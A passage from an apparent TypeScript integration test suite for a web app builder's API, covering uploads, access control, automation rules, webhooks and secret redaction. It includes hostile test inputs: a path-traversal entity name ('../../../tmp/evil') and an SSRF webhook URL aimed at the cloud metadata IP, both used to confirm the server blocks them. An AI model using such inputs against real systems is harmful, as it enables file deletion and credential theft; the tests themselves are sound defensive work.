 * existing canary-file test for a crafted VALUE's own traversal attempt,
 * but for a traversal reached through the entity NAME instead.
 */
test("replacing a file field's value on a record belonging to a path-traversal-named entity never deletes anything outside that project's own uploads directory", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `upload-entity-delete-traversal-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const unsafeEntityName = "../../../tmp/evil";
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: unsafeEntityName, fields: [{ name: "resume", type: "file", required: false }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    // A canary file shaped exactly like a real upload (UPLOADED_FILENAME's
    // own regex), sitting at the entity name's own traversal target --
    // standing in for another real project's own real upload, which an
    // attacker could reach the same way by guessing/observing its UUID.
    const canaryDir = path.join(tmpdir(), "evil");
    mkdirSync(canaryDir, { recursive: true });
    const canaryFilename = `${randomUUID()}.txt`;
    const canaryPath = path.join(canaryDir, canaryFilename);
    writeFileSync(canaryPath, "do not delete me");

    try {
      const createRes = await fetch(
        `${baseUrl}/api/projects/${projectId}/entities/${encodeURIComponent(unsafeEntityName)}`,
        {
          method: "POST",
          headers: authHeaders(token),
          body: JSON.stringify({}),
        },
      );
      assert.equal(createRes.status, 201);
      const { record } = (await createRes.json()) as { record: { id: number } };

      // Bypasses coerceValue's new round-908 write-time guard on purpose,
      // to simulate a bare-filename value that is already in storage by
      // some other means than today's create/update API.
      db.prepare(
        `UPDATE ${quoteIdentifier(tableNameFor(projectId, unsafeEntityName))} SET ${quoteIdentifier("resume")} = ? WHERE id = ?`,
      ).run(JSON.stringify({ url: canaryFilename, name: "x", size: 0, mimeType: "" }), record.id);

      const patchRes = await fetch(
        `${baseUrl}/api/projects/${projectId}/entities/${encodeURIComponent(unsafeEntityName)}/${record.id}`,
        {
          method: "PATCH",
          headers: authHeaders(token),
          body: JSON.stringify({ resume: "" }),
        },
      );
      assert.equal(patchRes.status, 200);
      await new Promise((resolve) => setTimeout(resolve, 20));

      assert.ok(
        existsSync(canaryPath),
        "clearing a file field on a traversal-named entity's own record must never delete a file outside this project's own uploads directory",
      );
    } finally {
      rmSync(canaryDir, { recursive: true, force: true });
    }
  });
});

/**
 * Same ordering guarantee as the test above, from the other direction:
 * a user with no access to this project must be rejected before multer
 * ever runs, even though the request is otherwise well-formed and
 * authenticated as a real user.
 */
test("uploading to a project the authenticated user has no access to is rejected, never reaching multer", async () => {
  await withServer(async (baseUrl, db) => {
    const ownerEmail = `upload-owner-${randomUUID()}@example.com`;
    await signup(baseUrl, ownerEmail);
    const owner = findUserByEmail(db, ownerEmail)!;
    const outsiderToken = await signup(baseUrl, `upload-outsider-${randomUUID()}@example.com`);

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Applicant", fields: [{ name: "resume", type: "file", required: false }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: owner.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const formData = new FormData();
    formData.append("file", new File(["irrelevant"], "x.txt", { type: "text/plain" }));
    const res = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/fields/resume/upload`, {
      method: "POST",
      headers: { authorization: `Bearer ${outsiderToken}` },
      body: formData,
    });
    assert.equal(res.status, 404);
  });
});

/**
 * The real HTTP route's own validation for the new "schedule" automation
 * trigger -- a schedule rule has no triggering record, so it needs a
 * scheduleTimeUtc and can't use toMode:"field" (there's nothing to read a
 * destination field from). Exercises the real CreateAutomationRuleSchema/
 * findAutomationRuleInvariantViolation validation through the real route,
 * not just the pure-function unit tests in automations.test.ts.
 */
test("creating a 'schedule' automation rule requires scheduleTimeUtc and toMode:static, and a valid one stores scheduleDaysOfWeek", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `schedule-automation-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const owner = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Reminder", fields: [{ name: "title", type: "text", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: owner.id, name: "Reminders", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const baseBody = { trigger: "schedule", actionType: "send_whatsapp", messageTemplate: "Good morning!" };

    const missingTime = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Reminder/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseBody, toMode: "static", toNumber: "972500000000" }),
    });
    assert.equal(missingTime.status, 400);
    assert.equal(((await missingTime.json()) as { code?: string }).code, "VALIDATION_ERROR");

    const fieldDestination = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Reminder/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseBody, scheduleTimeUtc: "09:00", toMode: "field", toField: "title" }),
    });
    assert.equal(fieldDestination.status, 400, "a schedule rule has no record to read a toMode:field destination from");

    const goodRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Reminder/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseBody, scheduleTimeUtc: "09:00", scheduleDaysOfWeek: "1,3,5", toMode: "static", toNumber: "972500000000" }),
    });
    assert.equal(goodRes.status, 201);
    const { rule } = (await goodRes.json()) as { rule: { id: string; scheduleTimeUtc: string; scheduleDaysOfWeek: string } };
    assert.equal(rule.scheduleTimeUtc, "09:00");
    assert.equal(rule.scheduleDaysOfWeek, "1,3,5");

    // A PATCH that would flip an existing schedule rule's toMode to "field"
    // must be rejected the same way creation is.
    const patchRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${rule.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ toMode: "field", toField: "title" }),
    });
    assert.equal(patchRes.status, 400);
  });
});

/**
 * Round 1098: creating a rule with trigger:"schedule" but a leftover
 * fieldName/fieldValue (e.g. a client that merely forgot to omit them,
 * rather than the bundled web UI's own convention of always sending
 * explicit nulls) used to be accepted silently -- nothing in
 * CreateAutomationRuleSchema's refine chain forbade it. Worse, PATCHing
 * an existing field_equals rule's trigger to "schedule" without also
 * explicitly nulling fieldName/fieldValue left the OLD condition in the
 * row (findAutomationRuleInvariantViolation's own `{ ...existing,
 * ...parsed.data }` merge never checked for this either) -- a schedule
 * rule that, per automations.test.ts's own matchesTrigger unit tests,
 * would then ALSO silently fire on every matching record create/update,
 * duplicating a real send on top of its own real scheduled firing.
 */
test("a 'schedule' automation rule can't carry a leftover fieldName/fieldValue, whether set at creation or left stale by a later PATCH", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `stale-field-automation-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const owner = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Order", fields: [{ name: "status", type: "text", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: owner.id, name: "Orders", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const createWithStaleFields = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        trigger: "schedule",
        scheduleTimeUtc: "09:00",
        fieldName: "status",
        fieldValue: "urgent",
        actionType: "send_whatsapp",
        toMode: "static",
        toNumber: "972500000000",
        messageTemplate: "Daily digest",
      }),
    });
    assert.equal(createWithStaleFields.status, 400, "a schedule rule must not be creatable with a leftover fieldName/fieldValue");

    const goodRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        trigger: "field_equals",
        fieldName: "status",
        fieldValue: "urgent",
        actionType: "send_whatsapp",
        toMode: "static",
        toNumber: "972500000000",
        messageTemplate: "Urgent order!",
      }),
    });
    assert.equal(goodRes.status, 201);
    const { rule } = (await goodRes.json()) as { rule: { id: string } };

    // Flips trigger to "schedule" WITHOUT explicitly nulling fieldName/
    // fieldValue -- the exact shape a caller other than the bundled web UI
    // (which always sends explicit nulls) could plausibly send.
    const patchToStaleSchedule = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${rule.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ trigger: "schedule", scheduleTimeUtc: "09:00" }),
    });
    assert.equal(patchToStaleSchedule.status, 400, "a PATCH that changes trigger away from field_equals must not silently keep the old fieldName/fieldValue");
  });
});

/**
 * Round 1099: automation rule creation deliberately has no project.status
 * guard (round 998's own comment: "pre-configuring automations ahead of
 * the first build" is intentional and already tested) -- so a rule can
 * already reference a field by the time it's removed, pre-build.
 * diffAndMigrate's own disable-sweep (migrate.ts) only ever runs on a
 * REFINE, diffing against a previously-BUILT spec; for a field added and
 * removed entirely before the very first build there is no "previous
 * build" for that sweep to diff against at all, so nothing anywhere ever
 * disabled a rule left dangling this specific way. Mirrors the exact
 * real-field-reference scenario the field-delete route's own fix reuses
 * from migrate.ts's sweep.
 */
test("removing a field pre-build disables any automation rule still referencing it as fieldName or toField, the same way a post-build refine already does", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `prebuild-field-remove-disable-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const owner = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        {
          name: "Lead",
          fields: [
            { name: "name", type: "text", required: true },
            { name: "phone", type: "text", required: true },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: owner.id, name: "Leads", description: "test", spec });
    // Deliberately no diffAndMigrate/markProjectBuilt here -- the project
    // is never built, the exact pre-build window this bug lives in.

    const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Lead/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        trigger: "record_created",
        actionType: "send_whatsapp",
        toMode: "field",
        toField: "phone",
        messageTemplate: "New lead!",
      }),
    });
    assert.equal(createRes.status, 201, "rule creation must still succeed pre-build -- this is the documented, intentional round-998 behavior");
    const { rule } = (await createRes.json()) as { rule: { id: string; enabled: boolean } };
    assert.equal(rule.enabled, true);

    const deleteRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Lead/fields/phone`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(deleteRes.status, 200, "the entity has a second field (name) so this is a normal field removal, not the last-field-rejection case");

    const listRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations`, { headers: authHeaders(token) });
    const { rules } = (await listRes.json()) as { rules: { id: string; enabled: boolean }[] };
    const afterRemoval = rules.find((r) => r.id === rule.id)!;
    assert.equal(afterRemoval.enabled, false, "the rule must be disabled the moment its own toField disappears, not left dangling until some later build/refine notices");
  });
});

/**
 * Round 1099: same gap, the other direction -- removing a whole entity
 * pre-build never disabled a rule that triggers on it at all (no
 * equivalent of disableAutomationRulesForEntity was ever called from this
 * route either).
 */
test("removing an entity pre-build disables any automation rule that triggers on it", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `prebuild-entity-remove-disable-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const owner = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        { name: "Lead", fields: [{ name: "name", type: "text", required: true }] },
        { name: "Note", fields: [{ name: "text", type: "text", required: true }] },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: owner.id, name: "Leads", description: "test", spec });

    const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Lead/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ trigger: "record_created", actionType: "send_whatsapp", toMode: "static", toNumber: "972500000000", messageTemplate: "New lead!" }),
    });
    assert.equal(createRes.status, 201);
    const { rule } = (await createRes.json()) as { rule: { id: string } };

    const deleteRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Lead`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(deleteRes.status, 200);

    const listRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations`, { headers: authHeaders(token) });
    const { rules } = (await listRes.json()) as { rules: { id: string; enabled: boolean }[] };
    assert.equal(rules.find((r) => r.id === rule.id)!.enabled, false, "the rule must be disabled the moment the entity it triggers on is removed");
  });
});

/**
 * Round 1100: the natural sibling of round 1099's fix -- a field's type
 * can change pre-build just as freely as it can be removed, and
 * validateAutomationToField ("only a text field can hold a phone number
 * or email address") is only ever checked once, at rule creation/PATCH,
 * never re-checked when the referenced field's type changes later.
 * Changing a toMode:"field" destination from text to number leaves the
 * rule pointed at a field it can never actually send.
 */
test("changing a field's type pre-build disables an automation rule whose toField destination the new type breaks, but leaves a still-valid one (text -> longtext) enabled", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `prebuild-type-change-disable-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const owner = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        {
          name: "Lead",
          fields: [
            { name: "phone", type: "text", required: true },
            { name: "notes", type: "text", required: false },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: owner.id, name: "Leads", description: "test", spec });

    const createPhoneRule = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Lead/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        trigger: "record_created",
        actionType: "send_whatsapp",
        toMode: "field",
        toField: "phone",
        messageTemplate: "New lead!",
      }),
    });
    assert.equal(createPhoneRule.status, 201);
    const { rule: phoneRule } = (await createPhoneRule.json()) as { rule: { id: string } };

    const createNotesRule = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Lead/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        trigger: "record_created",
        actionType: "send_whatsapp",
        toMode: "field",
        toField: "notes",
        messageTemplate: "New lead!",
      }),
    });
    assert.equal(createNotesRule.status, 201);
    const { rule: notesRule } = (await createNotesRule.json()) as { rule: { id: string } };

    // Breaks the phone rule's own destination (text -> number).
    const breakRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Lead/fields/phone/type`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ type: "number" }),
    });
    assert.equal(breakRes.status, 200);

    // Does NOT break the notes rule's own destination (text -> longtext,
    // both still valid per validateAutomationToField) -- must NOT be
    // disabled as a false positive.
    const safeRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Lead/fields/notes/type`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ type: "longtext" }),
    });
    assert.equal(safeRes.status, 200);

    const listRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations`, { headers: authHeaders(token) });
    const { rules } = (await listRes.json()) as { rules: { id: string; enabled: boolean }[] };
    assert.equal(
      rules.find((r) => r.id === phoneRule.id)!.enabled,
      false,
      "the rule whose toField destination the new type actually breaks must be disabled",
    );
    assert.equal(
      rules.find((r) => r.id === notesRule.id)!.enabled,
      true,
      "a rule whose toField is still a valid destination under the new type (text -> longtext) must NOT be disabled as a false positive",
    );
  });
});

/**
 * Round 967: a schedule rule's scheduleTimeUtc/scheduleDaysOfWeek are now
 * wall-clock values in its own scheduleTimezone (see isScheduledRuleDue's
 * own doc comment, apps/api/src/automations.ts), not literal UTC --
 * confirms the real IANA zone is validated at creation (an invalid one is
 * rejected before it could ever reach isScheduledRuleDue's own
 * Intl.DateTimeFormat call and throw there instead), round-trips through
 * GET, and can be changed via PATCH.
 */
test("creating a 'schedule' automation rule accepts and stores a real IANA scheduleTimezone, rejects a bogus one, and PATCH can change it", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `schedule-timezone-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const owner = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Reminder", fields: [{ name: "title", type: "text", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: owner.id, name: "Reminders", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const baseBody = {
      trigger: "schedule",
      actionType: "send_whatsapp",
      messageTemplate: "Good morning!",
      scheduleTimeUtc: "08:00",
      toMode: "static",
      toNumber: "972500000000",
    };

    const bogusZone = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Reminder/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseBody, scheduleTimezone: "Not/A_Real_Zone" }),
    });
    assert.equal(bogusZone.status, 400, "a scheduleTimezone that isn't a real IANA zone name must be rejected at creation, not silently stored");
    assert.equal(((await bogusZone.json()) as { code?: string }).code, "VALIDATION_ERROR");

    const goodRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Reminder/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseBody, scheduleTimezone: "Asia/Jerusalem" }),
    });
    assert.equal(goodRes.status, 201);
    const { rule } = (await goodRes.json()) as { rule: { id: string; scheduleTimezone: string } };
    assert.equal(rule.scheduleTimezone, "Asia/Jerusalem");

    const listRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations`, { headers: authHeaders(token) });
    const { rules } = (await listRes.json()) as { rules: { id: string; scheduleTimezone: string }[] };
    assert.equal(
      rules.find((r) => r.id === rule.id)?.scheduleTimezone,
      "Asia/Jerusalem",
      "scheduleTimezone must round-trip through GET, not just the create response",
    );

    const patchRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${rule.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ scheduleTimezone: "America/New_York" }),
    });
    assert.equal(patchRes.status, 200);
    const { rule: patched } = (await patchRes.json()) as { rule: { scheduleTimezone: string } };
    assert.equal(patched.scheduleTimezone, "America/New_York");

    const patchBogus = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${rule.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ scheduleTimezone: "Not/A_Real_Zone" }),
    });
    assert.equal(patchBogus.status, 400, "PATCH must validate scheduleTimezone the same way creation does");
  });
});

/**
 * The real HTTP route's own validation for the new "webhook" automation
 * action type: requires a real webhookUrl, rejects one pointing at a
 * blocked local/private host, and doesn't require toNumber/toField at
 * all (there's no WhatsApp destination to configure for a webhook).
 */
test("creating a 'webhook' automation rule requires a real, non-local webhookUrl, and doesn't require a WhatsApp destination", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `webhook-automation-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const owner = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Order", fields: [{ name: "status", type: "text", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: owner.id, name: "Orders", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const baseBody = { trigger: "record_created", actionType: "webhook", toMode: "static", messageTemplate: "New order!" };

    const missingUrl = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify(baseBody),
    });
    assert.equal(missingUrl.status, 400);
    assert.equal(((await missingUrl.json()) as { code?: string }).code, "VALIDATION_ERROR");

    const blockedHost = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseBody, webhookUrl: "http://169.254.169.254/latest/meta-data/" }),
    });
    assert.equal(blockedHost.status, 400, "a webhook pointed at the cloud instance-metadata IP must be rejected");

    const goodRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseBody, webhookUrl: "https://hooks.example.com/forge" }),
    });
    assert.equal(goodRes.status, 201, "no toNumber/toField given, and none should be required for a webhook action");
    const { rule } = (await goodRes.json()) as { rule: { id: string; webhookUrl: string; actionType: string } };
    assert.equal(rule.actionType, "webhook");
    assert.equal(rule.webhookUrl, "https://hooks.example.com/forge");

    // A PATCH that would clear webhookUrl on an existing webhook rule must
    // be rejected the same way creation is.
    const patchRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${rule.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ webhookUrl: null }),
    });
    assert.equal(patchRes.status, 400);
  });
});

/**
 * Round 974: a webhook rule's own outbound request carried no auth of any
 * kind -- unlike webhookUrl, webhookSecret is optional (a plain webhook
 * with no auth requirement is still a legitimate configuration), but when
 * set it must actually reach the real outbound request as a real
 * `Authorization: Bearer <secret>` header, and must be settable/clearable
 * through the same create/PATCH routes webhookUrl already goes through.
 */
test("a webhook automation rule's webhookSecret is optional, round-trips through create/PATCH, and is sent as a real Authorization header", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `webhook-secret-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const owner = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Order", fields: [{ name: "status", type: "text", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: owner.id, name: "Orders", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        trigger: "record_created",
        actionType: "webhook",
        toMode: "static",
        messageTemplate: "New order!",
        webhookUrl: "https://hooks.example.com/forge",
      }),
    });
    assert.equal(createRes.status, 201, "no webhookSecret given, and none should be required for a webhook action");
    const { rule } = (await createRes.json()) as { rule: { id: string; webhookSecret: string | null } };
    assert.equal(rule.webhookSecret, null);

    const patchRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${rule.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ webhookSecret: "s3cr3t-token" }),
    });
    assert.equal(patchRes.status, 200);
    const { rule: patched } = (await patchRes.json()) as { rule: { webhookSecret: string | null } };
    assert.equal(patched.webhookSecret, "s3cr3t-token");

    // Mocking the global fetch here also intercepts this test's OWN HTTP
    // calls to its own local test server (both go through the same global
    // `fetch` binding) -- unlike automations.test.ts's direct-call tests
    // above, which never make a real HTTP request at all. Only the real
    // webhook destination is faked; every other URL (the local server
    // itself) passes straight through to the real fetch.
    const originalFetch = globalThis.fetch;
    const calls: { url: string; init: RequestInit }[] = [];
    globalThis.fetch = (async (url: string, init?: RequestInit) => {
      if (url === "https://hooks.example.com/forge") {
        calls.push({ url, init: init! });
        return new Response(null, { status: 200 });
      }
      return originalFetch(url, init);
    }) as typeof fetch;
    try {
      const createOrderRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ status: "New" }),
      });
      assert.equal(createOrderRes.status, 201);
      // runAutomationsForRecordChange is deliberately fire-and-forget (not
      // awaited by the create-record route) -- give it a chance to run
      // before asserting on its effect, same convention as this file's
      // other fire-and-forget automation tests.
      await new Promise((resolve) => setTimeout(resolve, 20));
    } finally {
      globalThis.fetch = originalFetch;
    }
    assert.equal(calls.length, 1, "creating the record must have fired the webhook rule exactly once");
    assert.equal((calls[0]!.init.headers as Record<string, string>).authorization, "Bearer s3cr3t-token");

    const clearedRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${rule.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ webhookSecret: null }),
    });
    assert.equal(clearedRes.status, 200);
    assert.equal(((await clearedRes.json()) as { rule: { webhookSecret: string | null } }).rule.webhookSecret, null);
  });
});

/**
 * Round 996: end-to-end coverage for the new "send_email" automation
 * action through the real HTTP routes -- validation (toEmail/emailSubject
 * required, same shape as webhookUrl's own required-field tests above),
 * create/PATCH round-tripping, and a real record_created event actually
 * reaching the configured EmailSender's send() with interpolated
 * subject/body.
 */
test("creating a 'send_email' automation rule requires toEmail (or toField) and emailSubject, and a real record_created event sends through the configured EmailSender", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl, db) => {
      const email = `send-email-automation-${randomUUID()}@example.com`;
      const token = await signup(baseUrl, email);
      const owner = findUserByEmail(db, email)!;

      const spec: ProductSpec = {
        summary: "test",
        personas: [],
        roles: ["Admin"],
        entities: [
          {
            name: "Order",
            fields: [
              { name: "customerName", type: "text", required: true },
              { name: "status", type: "text", required: true },
            ],
          },
        ],
        screens: [],
        assumptions: [],
        openQuestions: [],
      };
      const projectId = randomUUID();
      insertProject(db, { id: projectId, ownerId: owner.id, name: "Orders", description: "test", spec });
      diffAndMigrate(db, projectId, undefined, spec);
      markProjectBuilt(db, projectId);

      const baseBody = { trigger: "record_created", actionType: "send_email", toMode: "static", messageTemplate: "New order from {{customerName}}" };

      const missingEmail = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order/automations`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ ...baseBody, emailSubject: "New order" }),
      });
      assert.equal(missingEmail.status, 400, "toEmail is required when toMode is static");
      assert.equal(((await missingEmail.json()) as { code?: string }).code, "VALIDATION_ERROR");

      const missingSubject = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order/automations`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ ...baseBody, toEmail: "owner@example.com" }),
      });
      assert.equal(missingSubject.status, 400, "emailSubject is required for a send_email rule");
      assert.equal(((await missingSubject.json()) as { code?: string }).code, "VALIDATION_ERROR");

      const invalidEmail = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order/automations`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ ...baseBody, toEmail: "not-an-email", emailSubject: "New order" }),
      });
      assert.equal(invalidEmail.status, 400, "toEmail must be a real email address");

      const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order/automations`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ ...baseBody, toEmail: "owner@example.com", emailSubject: "New order from {{customerName}}" }),
      });
      assert.equal(createRes.status, 201);
      const { rule } = (await createRes.json()) as { rule: { id: string; toEmail: string | null; emailSubject: string | null } };
      assert.equal(rule.toEmail, "owner@example.com");
      assert.equal(rule.emailSubject, "New order from {{customerName}}");

      const createOrderRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ customerName: "Dana Levi", status: "New" }),
      });
      assert.equal(createOrderRes.status, 201);

      for (let i = 0; i < 40 && emailSender.sentTo.length === 0; i++) {
        await new Promise((resolve) => setTimeout(resolve, 0));
      }
      assert.deepEqual(emailSender.sentTo, [
        { to: "owner@example.com", subject: "New order from Dana Levi", text: "New order from Dana Levi" },
      ]);
    },
    { emailSender },
  );
});

/**
 * Round 975: GET .../automations uses requireProjectAccess (any
 * collaborator, viewer included), not requireProjectWriteAccess -- correct
 * for every other field on a rule (a viewer genuinely can read this
 * project's configuration), but webhookSecret is a real external
 * credential (sent as Authorization: Bearer to a third-party webhook
 * destination), not ordinary project data. A viewer categorically can't
 * edit records or rules (every write route already rejects them), so
 * unlike an editor, they could never cause the same webhook POST
 * themselves -- yet before this round they could read the live secret
 * straight out of this GET response and use it against that external
 * system entirely outside the app. Confirms it's redacted to null for a
 * viewer, while an editor (and the owner) still see the real value
 * unchanged.
 */
test("GET .../automations redacts a webhook rule's webhookSecret for a 'viewer' collaborator, but not for an 'editor' collaborator or the owner", async () => {
  await withServer(async (baseUrl, db) => {
    const ownerEmail = `webhook-secret-rbac-owner-${randomUUID()}@example.com`;
    const ownerToken = await signup(baseUrl, ownerEmail);
    const owner = findUserByEmail(db, ownerEmail)!;
    const viewerEmail = `webhook-secret-rbac-viewer-${randomUUID()}@example.com`;
    const viewerToken = await signup(baseUrl, viewerEmail);
    const editorEmail = `webhook-secret-rbac-editor-${randomUUID()}@example.com`;
    const editorToken = await signup(baseUrl, editorEmail);

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Order", fields: [{ name: "status", type: "text", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: owner.id, name: "Orders", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

